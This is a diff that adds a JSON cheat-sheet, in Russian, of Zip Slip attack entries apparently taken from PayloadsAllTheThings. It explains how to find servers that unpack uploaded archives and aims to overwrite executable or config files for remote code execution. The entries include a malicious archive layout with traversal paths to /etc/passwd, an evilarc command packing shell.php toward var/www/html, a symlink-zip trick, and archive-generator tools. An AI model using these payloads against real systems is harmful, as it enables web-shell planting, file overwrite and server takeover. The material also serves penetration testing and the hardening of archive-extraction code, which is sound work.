@@ -1,0 +1,41 @@
+{
+  "category": "Zip Slip",
+  "source": "PayloadsAllTheThings/Zip Slip/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что такое Zip Slip и где искать",
+      "language": "text",
+      "tags": ["zip-slip", "methodology"],
+      "body": "Архив с traversal-именами (../../shell.php) при распаковке пишет файлы ВНЕ целевой папки → перезапись и RCE.\nГде искать: любой импорт/аплоад архива (zip, tar, jar, war, cpio, apk, rar, 7z), который сервер потом распаковывает.\nЦель: перезаписать исполняемый/конфиг-файл и дождаться его вызова (или вызвать самому)."
+    },
+    {
+      "subcategory": "Структура архива",
+      "title": "Пример злого архива (traversal-имена)",
+      "language": "text",
+      "tags": ["zip-slip", "traversal"],
+      "body": "malicious.zip\n  ├── ../../../../etc/passwd\n  └── ../../../../usr/local/bin/malicious_script.sh"
+    },
+    {
+      "subcategory": "Создание архива",
+      "title": "evilarc — архив с traversal",
+      "language": "bash",
+      "tags": ["zip-slip", "evilarc", "tool"],
+      "body": "python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15"
+    },
+    {
+      "subcategory": "Создание архива",
+      "title": "ZIP с симлинком",
+      "language": "bash",
+      "tags": ["zip-slip", "symlink"],
+      "body": "ln -s ../../../index.php symindex.txt\nzip --symlinks test.zip symindex.txt"
+    },
+    {
+      "subcategory": "Тулзы",
+      "title": "Инструменты",
+      "language": "text",
+      "tags": ["zip-slip", "tools"],
+      "body": "evilarc — tar/zip с directory traversal.\nslipit (usdAG) — генератор ZipSlip-архивов.\nСписок уязвимых библиотек/проектов: snyk/zip-slip-vulnerability."
+    }
+  ]
+}
